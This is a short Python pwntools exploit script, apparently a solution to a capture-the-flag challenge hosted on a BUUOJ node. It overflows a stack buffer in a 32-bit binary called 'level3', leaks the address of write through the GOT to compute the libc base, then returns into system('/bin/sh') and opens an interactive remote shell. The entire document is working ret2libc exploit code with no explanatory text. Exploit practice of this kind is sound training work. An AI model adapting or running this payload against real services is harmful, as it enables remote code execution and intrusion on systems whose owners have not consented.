from pwn import *

context(log_level='debug',os='linux',arch='i386')

p=remote('node5.buuoj.cn',25472)

elf=ELF('/home/lixingjian/pwn/level3')

p.recvuntil(b'Input:\n')

write_plt=elf.plt['write']
write_got=elf.got['write']
vulnarable=0x804844b

payload=b'a'*(0x88)+p32(0xdeadbeef)+p32(write_plt)+p32(vulnarable)+p32(1)+p32(write_got)+p32(4)

p.sendline(payload)

write_addr=u32(p.recv(4))
libc=ELF('/home/lixingjian/libc/libc-2.23-i386.so')
write_offset=libc.symbols['write']
libc.base=write_addr-write_offset

sys_addr=libc.base+libc.symbols['system']
binsh=libc.base+libc.search(b'/bin/sh\x00').__next__()

p.recvuntil(b'Input:\n')
payload=b'a'*(0x88)+p32(0xdeadbeef)+p32(sys_addr)+p32(0)+p32(binsh)
p.sendline(payload)

p.interactive()